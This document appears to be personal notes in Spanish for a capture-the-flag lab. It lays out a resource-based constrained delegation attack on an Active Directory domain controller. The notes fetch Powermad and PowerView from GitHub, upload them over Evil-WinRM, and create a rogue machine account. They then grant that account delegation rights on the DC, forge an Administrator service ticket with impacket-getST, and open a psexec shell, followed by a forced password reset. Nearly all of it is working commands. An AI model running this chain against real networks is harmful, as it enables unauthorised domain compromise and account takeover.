

# GENERIC ALL/RBCD
```shell
#SUBIDA DEL BINARIO
❯ wget https://raw.githubusercontent.com/Kevin-Robertson/Powermad/refs/heads/master/Powermad.ps1
*Evil-WinRM* PS C:\Users\support\Documents> upload Powermad.ps1

#IMPORTARLO
*Evil-WinRM* PS C:\Users\support\Documents> Import-Module .\Powermad.ps1

#CREAR OBJETO
*Evil-WinRM* PS C:\Users\support\Documents> New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose


#ENUMERACIÓN CON POWERVIEW
❯ wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Recon/PowerView.ps1
*Evil-WinRM* PS C:\Users\support\Documents> upload PowerView.ps1
*Evil-WinRM* PS C:\Users\support\Documents> Import-Module .\PowerView.ps1

#VERIFICAMOS QUE SE HAYA CREADO EL OBJETO
*Evil-WinRM* PS C:\Users\support\Documents> Get-DomainComputer SERVICEA
*Evil-WinRM* PS C:\Users\support\Documents> $ComputerSid = Get-DomainComputer SERVICEA -Properties objectsid | Select -Expand objectsid
*Evil-WinRM* PS C:\Users\support\Documents> $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
*Evil-WinRM* PS C:\Users\support\Documents> $SDBytes = New-Object byte[] ($SD.BinaryLength)
*Evil-WinRM* PS C:\Users\support\Documents> $SD.GetBinaryForm($SDBytes, 0)
*Evil-WinRM* PS C:\Users\support\Documents> Get-DomainComputer dc | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} #DONDE PONE DC PONER EL NOMBRE DE LA MÁQUINA
*Evil-WinRM* PS C:\Users\support\Documents> Get-DomainComputer dc -Properties 'msds-allowedtoactonbehalfofotheridentity' #DONDE PONE DC PONER EL NOMBRE DE LA MÁQUINA

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}

#SINCRONIZAR HORA CON LA MÁQUINA VICTIMA
❯ sudo rdate -n 10.10.11.174

#RECIBIR EL TGT
❯ impacket-getST -spn cifs/dc.support.htb -impersonate Administrator -dc-ip 10.10.11.174 support.htb/SERVICEA$:123456


#IMPORT EL CACHE
❯ export KRB5CCNAME=Administrator.ccache

#INICIAR SESION SIN CREDENCIALES, TIRANDO DEL CACHE
❯ impacket-psexec -k dc.support.htb
```

# CAMBIAR CONTRASEÑA
```shell
Invoke-Command -ComputerName localhost -Cred $cred -ScriptBlock {net user tristan.davies gorka123!}
	====> The command completed successfully.
net user tristan.davies gorka123!
```


